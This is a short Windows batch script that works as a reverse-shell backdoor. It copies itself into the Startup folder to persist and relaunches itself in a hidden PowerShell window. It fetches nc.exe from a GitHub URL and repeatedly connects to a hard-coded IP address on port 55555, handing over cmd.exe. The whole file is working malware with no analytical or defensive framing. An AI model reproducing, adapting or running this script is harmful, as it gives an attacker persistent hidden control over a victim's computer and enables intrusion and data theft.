@echo off
copy /y "C:\Windows\System32\bat.bat" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
if not "%~1"=="#" (
powershell -w hidden -c "Start-Process '%~f0' -ArgumentList '#'"
exit
)
:check
if exist "%~dp0nc.exe" goto loop
curl -L -o nc.exe https://raw.githubusercontent.com/VRVRxX/projects/main/nc.exe && start nc.exe
timeout /t 5 /nobreak>nul
goto check
:loop
nc 81.198.239.38 55555 -e cmd.exe
timeout /t 5 /nobreak>nul
goto loop
exit
